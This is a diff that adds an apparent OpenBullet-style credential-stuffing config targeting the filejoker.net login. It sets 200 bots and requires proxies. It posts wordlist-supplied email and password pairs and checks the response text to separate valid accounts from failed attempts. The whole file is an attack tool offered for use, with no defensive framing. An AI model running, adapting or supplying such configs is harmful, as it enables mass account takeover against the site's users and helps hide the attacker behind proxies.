@@ -1,0 +1,49 @@
+[SETTINGS]
+{
+  "Name": "FileJoker",
+  "SuggestedBots": 200,
+  "LastModified": "2019-04-02T22:19:13.6761365+07:00",
+  "AdditionalInfo": "",
+  "Author": "Onyx:Garfield#7189",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#REQUEST_HEADER REQUEST GET "https://filejoker.net/login" AutoRedirect=FALSE ReadResponseSource=FALSE 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+#REQUEST_LOGIN REQUEST POST "https://filejoker.net/login" AutoRedirect=FALSE 
+  CONTENT "email=<USER>&password=<PASS>&op=login&redirect=&rand=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "msg: " 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "Origin: https://filejoker.net" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+#SUCCESS_OF_NOT KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect Login or Password" 
+    KEY "Email and Password can't be blank! Valid email required" 
+  KEYCHAIN Success OR 
+    KEY "The document has moved <a href" 
